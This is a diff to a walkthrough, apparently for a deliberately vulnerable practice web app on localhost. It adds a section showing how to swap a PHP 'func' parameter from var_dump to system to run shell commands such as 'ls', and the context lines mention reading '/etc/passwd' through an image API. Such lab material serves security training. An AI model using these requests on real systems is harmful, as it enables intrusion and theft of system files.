@@ -74,3 +74,10 @@ current application directory is "/var/www/html".
 so let's try "http://localhost:3000/images/lkwa.png" to understand this api.  
   
 this api also gets system files like "/etc/passwd".
+
+## 0x08 – Variables variable
+
+when you click Submit Button, you can see this URL in the address bar.
+http://localhost:3000/variables/variable.php?func=var_dump&input=your_input
+
+try to change [var_dumps](https://www.php.net/manual/ja/function.var-dump.php) to [system](https://www.php.net/manual/ja/function.system.php) and input value to system command like "http://localhost:3000/variables/variable.php?func=system&input=ls".
